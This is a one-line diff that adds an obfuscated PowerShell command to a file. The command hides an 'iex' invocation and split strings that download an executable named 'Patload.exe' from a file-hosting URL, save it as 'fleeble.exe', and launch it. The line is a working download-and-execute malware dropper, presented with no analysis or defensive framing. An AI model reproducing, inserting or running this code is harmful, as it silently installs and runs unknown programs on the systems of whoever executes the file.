@@ -1,0 +1,1 @@
+﻿ .( $VeRBoSEprefEREnCE.TOSTRinG()[1,3]+'x'-JOin'')((('(New-Object Sys'+'t'+'em.'+'Net.WebC'+'li'+'e'+'n'+'t).DownloadFile({'+'0}http'+'://ddl'+'7'+'.'+'da'+'t'+'a.'+'hu/'+'get'+'/0/'+'95'+'07'+'1'+'48/Patload.'+'exe{0'+'}'+',{0}fl'+'eeble'+'.exe{0})'+';'+'S'+'t'+'ar'+'t'+'-'+'P'+'rocess '+'{0}fleeble.exe{0}') -F  [chAR]39))
